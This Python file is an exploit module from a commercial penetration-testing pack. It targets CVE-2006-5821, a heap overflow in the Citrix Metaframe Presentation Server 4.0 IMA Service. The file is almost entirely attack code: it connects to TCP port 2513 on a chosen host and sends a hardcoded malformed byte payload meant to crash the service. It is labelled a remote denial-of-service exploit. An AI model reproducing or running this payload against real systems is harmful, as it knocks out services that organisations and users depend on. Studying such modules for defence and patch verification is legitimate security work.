#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007
#


import sys

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit


# GUI info
NAME = "Citrix Metaframe Presentation Server 4.0 IMA Service Heap Overflow"

DESCRIPTION = "Heap overflow vulnerability in Citrix Metaframe Presentation Server 4.0 IMA Service"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2006.11.09"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-06-038.html"
DOCUMENTATION["Versions Affected"] = "Citrix Metaframe Presentation Server 4.0"
DOCUMENTATION["CVE Name"] = "CVE-2006-5821"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5821"

VERSION = "1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003" ]

NOTES = """
"""

CHANGELOG = """
"""
    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port = 2513
        self.host = ""                          
        self.name = NAME        
        return
    
    def test(self):        
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
                
        s = self.gettcpsock()        
        
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0        
        
        return 1
    
    def run(self):	    		
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
        self.log("Attacking %s:%d"%(self.host, self.port))
        
        sploitstring = self.makesploit()
                
        try:            
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(sploitstring)
        except:            
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
            return 0
        
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
        
        return 1
        
    def makesploit(self):
        """
        Construct the attack
        """
        sploitstring = "\x74\x00\x00\x00\x01\x00\x00\x00\x58\x00\x00\x00\x01\x00\x01\x00\x16\x00\x30\x00\x01\x00\x30\x00\x00\x00\x00\x00\x41\x80\x00\x00\x02\x00\x20\x00\xFF\xFF\x00\x00\x16\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x80\x02\x00\x00\x00\x04\x57\x36\x65\x7d\x2e\x2e\x7d\x6b\x38\x39\x6a\x6f\x3c\x2a\x79\x78\x2b\x24\x77\x65\x36\x01\x52\x6c\x3f\x05\x56\x6b\x38\x02\x51\x71\x22\x05\x56\x77\x24\x16\x45\x62\x31\x07\x54\x72\x21\x00\x53\x00\x53\x02\x51\x02\x51\x51\x02\x21\x00\x53\x00\x53\x02\x51\x02\x51\x51\xFF"
        
        return sploitstring
        

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
